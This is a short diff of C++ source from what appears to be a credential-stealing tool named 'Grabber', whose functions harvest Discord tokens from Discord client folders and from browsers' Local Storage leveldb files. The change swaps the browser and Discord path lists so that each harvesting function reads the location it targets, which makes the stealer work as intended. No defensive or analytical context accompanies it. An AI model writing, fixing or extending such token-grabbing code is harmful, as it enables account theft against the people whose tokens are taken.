@@ -1,4 +1,4 @@
-﻿#include <Grabber.h>
+#include <Grabber.h>
 
 #include <string>
 #include <vector>
@@ -53,7 +53,7 @@ namespace Grabber {
 
     namespace Discord {
         void getTokenDiscord(std::set<std::string>& tokens) {
-            for (fs::path path : Data::browser_paths) {
+            for (fs::path path : Data::discord_paths) {
                 if (!fs::exists(path)) continue;
                 std::string keyBeforeDecode = Utils::GetEncryptKey(path.string());
                 if (keyBeforeDecode.empty()) continue;
@@ -123,7 +123,7 @@ namespace Grabber {
         }
 
         void getTokenBrowserDiscord(std::set<std::string>& data) {
-            for (fs::path path : Data::discord_paths) {
+            for (fs::path path : Data::browser_paths) {
                 if (!fs::exists(path)) continue;
                 std::string tokensPath = path.string() + "\\Local Storage\\leveldb\\";
                 if (!fs::exists(tokensPath)) continue;
